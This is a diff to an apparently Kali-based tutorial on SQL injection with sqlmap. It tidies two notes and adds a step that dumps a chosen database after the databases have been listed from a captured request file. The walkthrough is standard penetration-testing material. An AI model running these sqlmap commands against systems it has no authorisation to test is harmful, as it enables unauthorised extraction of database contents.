@@ -29,9 +29,13 @@ nano peticion.txt
 ```bash
 sqlmap -r peticion.txt
 ```
-Note: At this point SQLmap would ask if we want to add some extra parameteres.
-Note 2: You can access the output on path: /home/kali/.local/share/sqlmap/output/<target_host_name>
+- Note: Sometimes SQLmap would ask if we want to add some extra parameteres.
+- Note 2: You can access the output on path: /home/kali/.local/share/sqlmap/output/<target_host_name>
 ## 4) Detect the current databases. After this payload we should see at the output the lists of Databases
 ```bash
 sqlmap -r peticion.txt -dbs
+```
+## 5) Dump the database information
+```bash
+sqlmap -r peticion.txt -D <nama_of_database> -dump
 ```
